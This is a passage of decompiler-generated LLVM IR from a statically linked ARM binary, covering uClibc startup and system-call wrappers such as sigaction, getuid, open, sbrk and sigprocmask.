  br i1 %v2_c1ec, label %dec_label_pc_c1f4, label %dec_label_pc_c1d0

dec_label_pc_c1f4:                                ; preds = %dec_label_pc_c1e8, %dec_label_pc_c1c8
  %v1_c1f8 = call i32 @_dl_aux_init(i32 %v2_c160)
  store i32 %v1_c1f8, i32* @r0, align 4
  %v1_c1fc = call i32 @__GI___uClibc_init(i32 %v1_c1f8)
  store i32 %v1_c1fc, i32* @r0, align 4
  %v2_c208 = icmp eq i32 %tmp37, 0
  br i1 %v2_c208, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_c1f4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_c1f4, %bb45
  %v0_c218 = phi i32 [ %tmp37, %dec_label_pc_c1f4 ], [ 4096, %bb45 ]
  %v3_c210 = icmp eq i32 %tmp36, -1
  %v8_c210 = icmp eq i32 %tmp36, -1
  store i32 ptrtoint (i32* @global_var_1bab8.107 to i32), i32* @r2, align 4
  store i32 %v0_c218, i32* @global_var_1bab8.107, align 4
  br i1 %v3_c210, label %dec_label_pc_c220, label %dec_label_pc_c248

dec_label_pc_c220:                                ; preds = %bb46
  %v0_c220 = call i32 @getuid()
  store i32 %v0_c220, i32* @r0, align 4
  store i32 %v0_c220, i32* @r4, align 4
  %v0_c228 = call i32 @geteuid()
  %v0_c22c = load i32, i32* @r4, align 4
  %v9_c22c = icmp eq i32 %v0_c22c, %v0_c228
  br i1 %v9_c22c, label %dec_label_pc_c234, label %dec_label_pc_c270

dec_label_pc_c234:                                ; preds = %dec_label_pc_c220
  %v1_c234 = call i32 @getgid(i32 %v0_c228)
  store i32 %v1_c234, i32* @r0, align 4
  store i32 %v1_c234, i32* @r4, align 4
  %v0_c23c = call i32 @getegid()
  %v0_c240 = load i32, i32* @r4, align 4
  %v9_c240 = icmp eq i32 %v0_c240, %v0_c23c
  br i1 %v9_c240, label %dec_label_pc_c248, label %dec_label_pc_c270

dec_label_pc_c248:                                ; preds = %dec_label_pc_c234, %bb46
  store i32 %tmp36, i32* @r2, align 4
  br i1 %v8_c210, label %dec_label_pc_c2dc, label %dec_label_pc_c254

dec_label_pc_c254:                                ; preds = %dec_label_pc_c248
  %v9_c258 = icmp eq i32 %tmp36, %tmp35
  br i1 %v9_c258, label %dec_label_pc_c260, label %dec_label_pc_c270

dec_label_pc_c260:                                ; preds = %dec_label_pc_c254
  br label %dec_label_pc_c270

dec_label_pc_c270:                                ; preds = %dec_label_pc_c260, %dec_label_pc_c254, %dec_label_pc_c234, %dec_label_pc_c220
  %v3_c278 = call i32 @__check_one_fd(i32 0, i16* inttoptr (i32 32768 to i16*))
  %v3_c284 = call i32 @__check_one_fd(i32 1, i16* inttoptr (i32 32770 to i16*))
  %v3_c290 = call i32 @__check_one_fd(i32 2, i16* inttoptr (i32 32770 to i16*))
  br label %dec_label_pc_c2dc

dec_label_pc_c2dc:                                ; preds = %dec_label_pc_c270, %dec_label_pc_c248
  %v0_c2a0 = load i32, i32* @r6, align 4
  %v1_c2a0 = inttoptr i32 %v0_c2a0 to i32*
  %v2_c2a0 = load i32, i32* %v1_c2a0, align 4
  store i32 %v2_c2a0, i32* bitcast (i32** @global_var_1b70c.202 to i32*), align 4
  store i32 %arg5, i32* @global_var_1babc.178, align 4
  %v2_c2dc = icmp eq i32 %arg4, 0
  br i1 %v2_c2dc, label %dec_label_pc_c318, label %bb47

bb47:                                             ; preds = %dec_label_pc_c2dc
  br label %dec_label_pc_c318

dec_label_pc_c318:                                ; preds = %dec_label_pc_c2dc, %bb47
  call void @__pseudo_branch(i32 %arg4)
  store i32 0, i32* @r5, align 4
  %v1_c328 = call i32 @__errno_location()
  %v2_c330 = inttoptr i32 %v1_c328 to i32*
  store i32 0, i32* %v2_c330, align 4
  %v1_c344 = call i32 @__GI___h_errno_location()
  %v2_c34c = inttoptr i32 %v1_c344 to i32*
  store i32 0, i32* %v2_c34c, align 4
  %v0_c35c = load i32, i32* @r8, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_c368 = call i32 @__GI_exit(i32 %v0_c35c)
  ret i32 %v1_c368

; uselistorder directives
  uselistorder i32 %v2_c1e8, { 1, 0 }
  uselistorder i32 %v1_c1e4, { 1, 0 }
  uselistorder i1 %v2_c1d0, { 1, 0 }
  uselistorder i32 %v4_c1b8, { 1, 0, 2 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %tmp36, { 1, 3, 0, 2 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 2, 1 }
  uselistorder i32* @global_var_1bab8.107, { 1, 4, 0, 2, 3 }
  uselistorder i32 120, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c318, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %dec_label_pc_c1e8, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_c1d0, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
}

define i32 @__libc_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_c3a0 = load i32, i32* @r4, align 4
  %v6_c3a0 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_c3a4 = icmp eq i32* %arg2, null
  %v2_c3a8 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  br i1 %v2_c3a4, label %dec_label_pc_c414, label %dec_label_pc_c3b8

dec_label_pc_c3b8:                                ; preds = %entry
  %v2_c3bc = load i32, i32* %arg2, align 4
  %v4_c3bc = add i32 %tmp, 4
  store i32 %v4_c3bc, i32* @r1, align 4
  %v2_c3c0 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_c3c0, i32* @r0, align 4
  store i32 128, i32* @r2, align 4
  store i32 %v2_c3bc, i32* %stack_var_-156, align 4
  %v0_c3cc = call i32 @memcpy()
  store i32 %v0_c3cc, i32* %r0.global-to-local, align 4
  %v0_c3d0 = load i32, i32* @r4, align 4
  %v1_c3d0 = add i32 %v0_c3d0, 132
  %v2_c3d0 = inttoptr i32 %v1_c3d0 to i32*
  %v3_c3d0 = load i32, i32* %v2_c3d0, align 4
  %v1_c3d4 = and i32 %v3_c3d0, 67108864
  %v2_c3d4 = icmp eq i32 %v1_c3d4, 0
  br i1 %v2_c3d4, label %dec_label_pc_c3e8, label %bb

bb:                                               ; preds = %dec_label_pc_c3b8
  br label %dec_label_pc_c404

dec_label_pc_c3e8:                                ; preds = %dec_label_pc_c3b8
  %v1_c3f0 = and i32 %v3_c3d0, 4
  %v2_c3f0 = icmp eq i32 %v1_c3f0, 0
  br i1 %v2_c3f0, label %bb21, label %bb20

bb20:                                             ; preds = %dec_label_pc_c3e8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_c3e8, %bb20
  br label %dec_label_pc_c404

dec_label_pc_c404:                                ; preds = %bb, %bb21
  %v2_c404 = icmp eq i32 %v0_c3d0, 0
  %v3_c408 = ptrtoint i32* %stack_var_-156 to i32
  %.v3_c408 = select i1 %v2_c404, i32 0, i32 %v3_c408
  %v0_c414.pre = load i32, i32* @r5, align 4
  %v0_c424.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c414

dec_label_pc_c414:                                ; preds = %dec_label_pc_c404, %entry
  %v0_c424 = phi i32 [ %arg1, %entry ], [ %v0_c424.pre, %dec_label_pc_c404 ]
  %v0_c414 = phi i32 [ %arg3, %entry ], [ %v0_c414.pre, %dec_label_pc_c404 ]
  %storemerge = phi i32 [ 0, %entry ], [ %.v3_c408, %dec_label_pc_c404 ]
  store i32 %storemerge, i32* @r1, align 4
  %v2_c414 = icmp eq i32 %v0_c414, 0
  %.v2_c3a8 = select i1 %v2_c414, i32 0, i32 %v2_c3a8
  store i32 %.v2_c3a8, i32* @r2, align 4
  store i32 %v0_c424, i32* %r0.global-to-local, align 4
  %v1_c428 = call i32 @__syscall_rt_sigaction(i32 %v0_c424)
  store i32 %v1_c428, i32* %r0.global-to-local, align 4
  %v0_c42c = load i32, i32* @r5, align 4
  %v2_c42c = icmp eq i32 %v0_c42c, 0
  br i1 %v2_c42c, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_c414
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_c414, %bb25
  %v0_c43c.pr = phi i32 [ 0, %dec_label_pc_c414 ], [ 1, %bb25 ]
  %v1_c434 = icmp slt i32 %v1_c428, 0
  br i1 %v1_c434, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %bb26
  br label %dec_label_pc_c470

thread-pre-split:                                 ; preds = %bb26
  %v2_c43c = icmp eq i32 %v0_c43c.pr, 0
  store i32 %v1_c428, i32* @r4, align 4
  br i1 %v2_c43c, label %dec_label_pc_c470, label %dec_label_pc_c448

dec_label_pc_c448:                                ; preds = %thread-pre-split
  %v2_c448 = load i32, i32* %stack_var_-296, align 4
  store i32 %v0_c42c, i32* %r0.global-to-local, align 4
  %v2_c450 = inttoptr i32 %v0_c42c to i32*
  store i32 %v2_c448, i32* %v2_c450, align 4
  %v3_c450 = load i32, i32* %r0.global-to-local, align 4
  %v4_c450 = add i32 %v3_c450, 4
  store i32 %v4_c450, i32* @r0, align 4
  %v2_c454 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_c454, i32* @r1, align 4
  store i32 128, i32* @r2, align 4
  %v0_c45c = call i32 @memcpy()
  store i32 %v0_c45c, i32* %r0.global-to-local, align 4
  %v1_c464 = load i32, i32* @r5, align 4
  %v2_c464 = add i32 %v1_c464, 136
  %v3_c464 = inttoptr i32 %v2_c464 to i32*
  %v1_c46c = load i32, i32* @r5, align 4
  %v2_c46c = add i32 %v1_c46c, 132
  %v3_c46c = inttoptr i32 %v2_c46c to i32*
  %v0_c470.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_c470

dec_label_pc_c470:                                ; preds = %thread-pre-split.thread, %thread-pre-split, %dec_label_pc_c448
  %v0_c470 = phi i32 [ %v1_c428, %thread-pre-split ], [ %v0_c470.pre, %dec_label_pc_c448 ], [ %v1_c428, %thread-pre-split.thread ]
  store i32 %v0_c470, i32* %r0.global-to-local, align 4
  store i32 %v3_c3a0, i32* @r4, align 4
  store i32 %v6_c3a0, i32* @r5, align 4
  ret i32 %v0_c470

; uselistorder directives
  uselistorder i32 %v0_c470, { 1, 0 }
  uselistorder i32 %v0_c42c, { 1, 0, 2 }
  uselistorder i32 %v0_c424, { 1, 0 }
  uselistorder i32* %stack_var_-156, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 6, 5, 7, 0 }
  uselistorder label %dec_label_pc_c470, { 2, 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_c404, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
}

define i32 @__default_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_c484 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_c484
}

define i32 @__default_rt_sa_restorer(%sigcontext* %scp) local_unnamed_addr {
entry:
  %v3_c488 = call i32 @sigreturn(%sigcontext* %scp)
  ret i32 %v3_c488
}

define i32 @__syscall_rt_sigaction(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c48c = load i32, i32* @r4, align 4
  store i32 %v3_c48c, i32* %stack_var_-8, align 4
  %v1_c490 = load i32, i32* @r1, align 4
  %v2_c490 = inttoptr i32 %v1_c490 to %sigaction*
  %v3_c490 = load i32, i32* @r2, align 4
  %v4_c490 = inttoptr i32 %v3_c490 to %sigaction*
  %v5_c490 = call i32 @sigaction(i32 %arg1, %sigaction* %v2_c490, %sigaction* %v4_c490)
  store i32 %v5_c490, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v5_c490, -4095
  br i1 %tmp, label %dec_label_pc_c4b0, label %dec_label_pc_c4a0

dec_label_pc_c4a0:                                ; preds = %entry
  %v0_c4a0 = call i32 @__errno_location()
  %v0_c4a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c4a4 = sub i32 0, %v0_c4a4
  %v2_c4a8 = inttoptr i32 %v0_c4a0 to i32*
  store i32 %v1_c4a4, i32* %v2_c4a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c4b0

dec_label_pc_c4b0:                                ; preds = %entry, %dec_label_pc_c4a0
  %v0_c4b0 = phi i32 [ %v5_c490, %entry ], [ -1, %dec_label_pc_c4a0 ]
  %v2_c4b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c4b4, i32* %r4.global-to-local, align 4
  ret i32 %v0_c4b0

; uselistorder directives
  uselistorder i32 %v5_c490, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c4b0, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c4b8 = load i32, i32* @r4, align 4
  store i32 %v3_c4b8, i32* %stack_var_-8, align 4
  %v0_c4c0 = load i32, i32* @r0, align 4
  store i32 %v0_c4c0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c4c0, -4095
  br i1 %tmp, label %dec_label_pc_c4dc, label %dec_label_pc_c4cc

dec_label_pc_c4cc:                                ; preds = %entry
  %v0_c4cc = call i32 @__errno_location()
  %v0_c4d0 = load i32, i32* %r4.global-to-local, align 4
  %v1_c4d0 = sub i32 0, %v0_c4d0
  %v2_c4d4 = inttoptr i32 %v0_c4cc to i32*
  store i32 %v1_c4d0, i32* %v2_c4d4, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_c4e0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c4dc

dec_label_pc_c4dc:                                ; preds = %entry, %dec_label_pc_c4cc
  %v2_c4e0 = phi i32 [ %v3_c4b8, %entry ], [ %v2_c4e0.pre, %dec_label_pc_c4cc ]
  %v0_c4dc = phi i32 [ %v0_c4c0, %entry ], [ -1, %dec_label_pc_c4cc ]
  store i32 %v2_c4e0, i32* @r4, align 4
  ret i32 %v0_c4dc

; uselistorder directives
  uselistorder i32 %v0_c4c0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c4dc, { 1, 0 }
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c4e4 = load i32, i32* @r4, align 4
  store i32 %v3_c4e4, i32* %stack_var_-8, align 4
  %v0_c4ec = load i32, i32* @r0, align 4
  store i32 %v0_c4ec, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c4ec, -4095
  br i1 %tmp, label %dec_label_pc_c508, label %dec_label_pc_c4f8

dec_label_pc_c4f8:                                ; preds = %entry
  %v0_c4f8 = call i32 @__errno_location()
  %v0_c4fc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4fc = sub i32 0, %v0_c4fc
  %v2_c500 = inttoptr i32 %v0_c4f8 to i32*
  store i32 %v1_c4fc, i32* %v2_c500, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_c50c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c508

dec_label_pc_c508:                                ; preds = %entry, %dec_label_pc_c4f8
  %v2_c50c = phi i32 [ %v3_c4e4, %entry ], [ %v2_c50c.pre, %dec_label_pc_c4f8 ]
  %v0_c508 = phi i32 [ %v0_c4ec, %entry ], [ -1, %dec_label_pc_c4f8 ]
  store i32 %v2_c50c, i32* @r4, align 4
  ret i32 %v0_c508

; uselistorder directives
  uselistorder i32 %v0_c4ec, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c508, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c510 = load i32, i32* @r4, align 4
  store i32 %v3_c510, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_c534, label %dec_label_pc_c524

dec_label_pc_c524:                                ; preds = %entry
  %v0_c524 = call i32 @__errno_location()
  %v0_c528 = load i32, i32* %r4.global-to-local, align 4
  %v1_c528 = sub i32 0, %v0_c528
  %v2_c52c = inttoptr i32 %v0_c524 to i32*
  store i32 %v1_c528, i32* %v2_c52c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_c538.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c534

dec_label_pc_c534:                                ; preds = %entry, %dec_label_pc_c524
  %v2_c538 = phi i32 [ %v3_c510, %entry ], [ %v2_c538.pre, %dec_label_pc_c524 ]
  %v0_c534 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_c524 ]
  store i32 %v2_c538, i32* %r4.global-to-local, align 4
  ret i32 %v0_c534

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c534, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c53c = load i32, i32* @r4, align 4
  store i32 %v3_c53c, i32* %stack_var_-8, align 4
  %v0_c544 = load i32, i32* @r0, align 4
  store i32 %v0_c544, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c544, -4095
  br i1 %tmp, label %dec_label_pc_c560, label %dec_label_pc_c550

dec_label_pc_c550:                                ; preds = %entry
  %v0_c550 = call i32 @__errno_location()
  %v0_c554 = load i32, i32* %r4.global-to-local, align 4
  %v1_c554 = sub i32 0, %v0_c554
  %v2_c558 = inttoptr i32 %v0_c550 to i32*
  store i32 %v1_c554, i32* %v2_c558, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_c564.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c560

dec_label_pc_c560:                                ; preds = %entry, %dec_label_pc_c550
  %v2_c564 = phi i32 [ %v3_c53c, %entry ], [ %v2_c564.pre, %dec_label_pc_c550 ]
  %v0_c560 = phi i32 [ %v0_c544, %entry ], [ -1, %dec_label_pc_c550 ]
  store i32 %v2_c564, i32* %r4.global-to-local, align 4
  ret i32 %v0_c560

; uselistorder directives
  uselistorder i32 %v0_c544, { 1, 0, 2 }
  uselistorder label %dec_label_pc_c560, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %v1_c578 = and i32 %arg2, 64
  %v2_c578 = icmp eq i32 %v1_c578, 0
  br i1 %v2_c578, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v6_c568 = load i32, i32* @r2, align 4
  %phitmp = urem i32 %v6_c568, 65536
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v0_c588 = phi i32 [ 0, %entry ], [ %phitmp, %bb ]
  store i32 %v0_c588, i32* @r2, align 4
  %v4_c590 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %arg2)
  %v7_c594 = icmp eq i32 %v4_c590, -4096
  store i1 %v7_c594, i1* @cpsr_z, align 1
  store i32 %v4_c590, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v4_c590, -4095
  br i1 %tmp, label %dec_label_pc_c5b0, label %dec_label_pc_c5a0

dec_label_pc_c5a0:                                ; preds = %.thread1
  %v0_c5a0 = call i32 @__errno_location()
  %v0_c5a4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c5a4 = sub i32 0, %v0_c5a4
  %v2_c5a8 = inttoptr i32 %v0_c5a0 to i32*
  store i32 %v1_c5a4, i32* %v2_c5a8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c5b0

dec_label_pc_c5b0:                                ; preds = %.thread1, %dec_label_pc_c5a0
  %v0_c5b0 = phi i32 [ %v4_c590, %.thread1 ], [ -1, %dec_label_pc_c5a0 ]
  ret i32 %v0_c5b0

; uselistorder directives
  uselistorder i32 %v4_c590, { 2, 0, 3, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_c5b0, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r2, align 4
  %v0_c5cc = load i32, i32* @r0, align 4
  %v2_c5cc = inttoptr i32 %v0_c5cc to i8*
  %v3_c5cc = call i32 @__libc_open(i8* %v2_c5cc, i32 577)
  %v0_c5d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c5d0, label %bb, label %bb2

bb:                                               ; preds = %entry
  %v6_c5d0 = and i32 %v3_c5cc, 36
  br label %bb2

bb2:                                              ; preds = %entry, %bb
  %v7_c5d0 = phi i32 [ %v3_c5cc, %entry ], [ %v6_c5d0, %bb ]
  ret i32 %v7_c5d0

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_c5d4 = load i32, i32* @r4, align 4
  store i32 %v3_c5d4, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_1baec.215 to i32), i32* %r4.global-to-local, align 4
  %v2_c5dc = load i32, i32* @global_var_1baec.215, align 4
  %v2_c5e0 = icmp eq i32 %v2_c5dc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_c5e0, label %dec_label_pc_c5f0, label %dec_label_pc_c5fc

dec_label_pc_c5f0:                                ; preds = %entry
  %v2_c5f0 = call i32 @__GI_brk(i32* null)
  %v1_c5f4 = icmp slt i32 %v2_c5f0, 0
  br i1 %v1_c5f4, label %dec_label_pc_c61c, label %dec_label_pc_c5fcthread-pre-split

dec_label_pc_c5fcthread-pre-split:                ; preds = %dec_label_pc_c5f0
  %v0_c600.pr = load i32, i32* %r5.global-to-local, align 4
  %v2_c5fc.pre = load i32, i32* @global_var_1baec.215, align 4
  br label %dec_label_pc_c5fc

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5fcthread-pre-split, %entry
  %v2_c5fc = phi i32 [ %v2_c5fc.pre, %dec_label_pc_c5fcthread-pre-split ], [ %v2_c5dc, %entry ]
  %v1_c608 = phi i32 [ %v0_c600.pr, %dec_label_pc_c5fcthread-pre-split ], [ %arg1, %entry ]
  %v2_c600 = icmp eq i32 %v1_c608, 0
  store i32 %v2_c5fc, i32* %r4.global-to-local, align 4
  br i1 %v2_c600, label %dec_label_pc_c620, label %dec_label_pc_c610

dec_label_pc_c610:                                ; preds = %dec_label_pc_c5fc
  %v2_c608 = add i32 %v1_c608, %v2_c5fc
  %v1_c610 = inttoptr i32 %v2_c608 to i32*
  %v2_c610 = call i32 @__GI_brk(i32* %v1_c610)
  %v1_c614 = icmp slt i32 %v2_c610, 0
  br i1 %v1_c614, label %dec_label_pc_c61c, label %dec_label_pc_c610.dec_label_pc_c620_crit_edge

dec_label_pc_c610.dec_label_pc_c620_crit_edge:    ; preds = %dec_label_pc_c610
  %v0_c620.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c620

dec_label_pc_c61c:                                ; preds = %dec_label_pc_c610, %dec_label_pc_c5f0
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c620

dec_label_pc_c620:                                ; preds = %dec_label_pc_c610.dec_label_pc_c620_crit_edge, %dec_label_pc_c5fc, %dec_label_pc_c61c
  %v0_c620 = phi i32 [ %v0_c620.pre, %dec_label_pc_c610.dec_label_pc_c620_crit_edge ], [ %v2_c5fc, %dec_label_pc_c5fc ], [ -1, %dec_label_pc_c61c ]
  %v2_c624 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c624, i32* @r4, align 4
  ret i32 %v0_c620

; uselistorder directives
  uselistorder i32 %v2_c5fc, { 1, 0, 2 }
  uselistorder i32* null, { 0, 1, 3, 4, 5, 6, 2, 7 }
  uselistorder label %dec_label_pc_c620, { 2, 0, 1 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c62c = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v3_c62c, label %.thread, label %bb

.thread:                                          ; preds = %entry
  %v3_c6345 = load i32, i32* @r4, align 4
  store i32 %v3_c6345, i32* %stack_var_-8, align 4
  br label %dec_label_pc_c654

bb:                                               ; preds = %entry
  %v3_c634 = load i32, i32* @r4, align 4
  store i32 %v3_c634, i32* %stack_var_-8, align 4
  %tmp12 = icmp ult i32 %arg1, 3
  br i1 %tmp12, label %dec_label_pc_c654, label %dec_label_pc_c640

dec_label_pc_c640:                                ; preds = %bb
  %v0_c640 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_c64c = inttoptr i32 %v0_c640 to i32*
  store i32 22, i32* %v2_c64c, align 4
  %v0_c678.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c654:                                ; preds = %.thread, %bb
  %v7_c654 = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp)
  store i32 %v7_c654, i32* %r4.global-to-local, align 4
  %tmp13 = icmp ult i32 %v7_c654, -4095
  br i1 %tmp13, label %dec_label_pc_c674, label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c654
  %v0_c664 = call i32 @__errno_location()
  %v0_c668 = load i32, i32* %r4.global-to-local, align 4
  %v1_c668 = sub i32 0, %v0_c668
  %v2_c66c = inttoptr i32 %v0_c664 to i32*
  store i32 %v1_c668, i32* %v2_c66c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c654, %dec_label_pc_c664
  %v0_c674 = phi i32 [ %v7_c654, %dec_label_pc_c654 ], [ -1, %dec_label_pc_c664 ]
  store i32 %v0_c674, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c640, %dec_label_pc_c674
  %v0_c678 = phi i32 [ %v0_c678.pre, %dec_label_pc_c640 ], [ %v0_c674, %dec_label_pc_c674 ]
  %v2_c67c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c67c, i32* %r4.global-to-local, align 4
  ret i32 %v0_c678

; uselistorder directives
  uselistorder i32 %v7_c654, { 1, 0, 2 }
  uselistorder i32* %stack_var_-8, { 1, 2, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_c678, { 1, 0 }
  uselistorder label %dec_label_pc_c674, { 1, 0 }
  uselistorder label %dec_label_pc_c654, { 1, 0 }
}

define i32 @times() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c680 = load i32, i32* @r4, align 4
  store i32 %v3_c680, i32* %stack_var_-8, align 4
  %v0_c684 = call i32 @times()
  store i32 %v0_c684, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c684, -4095
  br i1 %tmp, label %dec_label_pc_c6a4, label %dec_label_pc_c694

dec_label_pc_c694:                                ; preds = %entry
  %v0_c694 = call i32 @__errno_location()
  %v0_c698 = load i32, i32* %r4.global-to-local, align 4
  %v1_c698 = sub i32 0, %v0_c698
  %v2_c69c = inttoptr i32 %v0_c694 to i32*
  store i32 %v1_c698, i32* %v2_c69c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %entry, %dec_label_pc_c694
  %v0_c6a4 = phi i32 [ %v0_c684, %entry ], [ -1, %dec_label_pc_c694 ]
  %v2_c6a8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c6a8, i32* %r4.global-to-local, align 4
  ret i32 %v0_c6a4

; uselistorder directives
  uselistorder i32 %v0_c684, { 1, 0, 2 }
  uselistorder i32 ()* @times, { 1, 0 }
  uselistorder label %dec_label_pc_c6a4, { 1, 0 }
}

define i32 @wait4() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_c6ac = load i32, i32* @r4, align 4
  store i32 %v3_c6ac, i32* %stack_var_-8, align 4
  %v0_c6b0 = call i32 @wait4()
  store i32 %v0_c6b0, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_c6b0, -4095
  br i1 %tmp, label %dec_label_pc_c6d0, label %dec_label_pc_c6c0

